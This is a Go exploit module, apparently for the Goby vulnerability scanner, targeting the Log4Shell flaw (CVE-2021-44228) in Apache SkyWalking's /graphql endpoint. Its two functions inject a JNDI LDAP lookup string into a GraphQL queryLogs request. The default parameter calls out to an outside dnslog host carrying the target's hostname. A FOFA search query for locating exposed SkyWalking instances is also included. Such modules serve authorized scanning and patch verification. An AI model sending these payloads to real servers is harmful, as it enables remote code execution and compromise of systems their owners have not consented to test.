package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"time"
)

func init() {
	expJson := `{
    "Name": "Apache Skywalking log4j2 graphql Api RCE (CVE-2021-44228)",
    "Description": "<p>Apache SkyWalking is an application performance monitor mainly used by the Apache Software Foundation for microservices, cloud native and container-based environments.</p><p>A log4j2 vulnerability (CVE-2021-44228) exists in the Apache SkyWalking performance monitoring system, which allows attackers to remotely execute code and control server permissions.</p>",
    "Impact": "<p>Apache Skywalking log4j2 RCE (CVE-2021-44228)</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/apache/skywalking\">https://github.com/apache/skywalking</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Apache Skywalking",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Apache Skywalking log4j2 graphql 接口命令执行漏洞 (CVE-2021-44228)",
            "Product": "Apache Skywalking",
            "Description": "<p>Apache SkyWalking是美国阿帕奇软件（Apache Software）基金会的一款主要用于微服务、云原生和基于容器等环境的应用程序性能监视器。</p><p>Apache SkyWalking 性能监视系统存在log4j2 漏洞（CVE-2021-44228），攻击者可利用漏洞远程执行代码，控制服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/apache/skywalking\">https://github.com/apache/skywalking</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>Apache SkyWalking 性能监视系统存在log4j2 漏洞（CVE-2021-44228），攻击者可利用漏洞远程执行代码，控制服务器权限。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Apache Skywalking log4j2 graphql Api RCE (CVE-2021-44228)",
            "Product": "Apache Skywalking",
            "Description": "<p>Apache SkyWalking is an application performance monitor mainly used by the Apache Software Foundation for microservices, cloud native and container-based environments.</p><p>A log4j2 vulnerability (CVE-2021-44228) exists in the Apache SkyWalking performance monitoring system, which allows attackers to remotely execute code and control server permissions.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/apache/skywalking\">https://github.com/apache/skywalking</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Apache Skywalking log4j2 RCE (CVE-2021-44228)</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "title=\"SkyWalking\" && body=\"SkyWalking\"",
    "GobyQuery": "title=\"SkyWalking\" && body=\"SkyWalking\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://github.com/apache/skywalking",
    "DisclosureDate": "2022-01-04",
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "10.0",
    "CVEIDs": [
        "CVE-2021-44228"
    ],
    "CNVD": [
        "CNVD-2021-95914"
    ],
    "CNNVD": [
        "CNNVD-202112-799"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "dnslog",
            "type": "input",
            "value": "${jndi:ldap://${hostName}.xxx.dnslog.cn",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10251"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			cmd := fmt.Sprintf("${jndi:ldap://%s}", checkUrl)
			uri2 := "/graphql"
			cfg2 := httpclient.NewPostRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			cfg2.Header.Store("Content-Type", "application/json;charset=UTF-8")
			cfg2.Data = fmt.Sprintf(`{
    "query":"query queryLogs($condition: LogQueryCondition) {
  queryLogs(condition: $condition) {
    total
    logs {
      serviceId
 %s
      serviceName
      isError
      content
    }
  }
}
",
    "variables":{
        "condition":{
            "metricName":"test",
            "state":"ALL",
            "paging":{
                "pageSize":10
            }
        }
    }
}`, cmd)
			httpclient.DoHttpRequest(u, cfg2)
			return godclient.PullExists(checkStr, time.Second*10)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["dnslog"].(string)
			uri2 := "/graphql"
			cfg2 := httpclient.NewPostRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			cfg2.Header.Store("Content-Type", "application/json;charset=UTF-8")
			cfg2.Data = fmt.Sprintf(`{
    "query":"query queryLogs($condition: LogQueryCondition) {
  queryLogs(condition: $condition) {
    total
    logs {
      serviceId
 %s
      serviceName
      isError
      content
    }
  }
}
",
    "variables":{
        "condition":{
            "metricName":"test",
            "state":"ALL",
            "paging":{
                "pageSize":10
            }
        }
    }
}`, cmd)
			httpclient.DoHttpRequest(expResult.HostInfo, cfg2)
			expResult.Output = "see your dnslog"
			expResult.Success = true
			return expResult
		},
	))
}
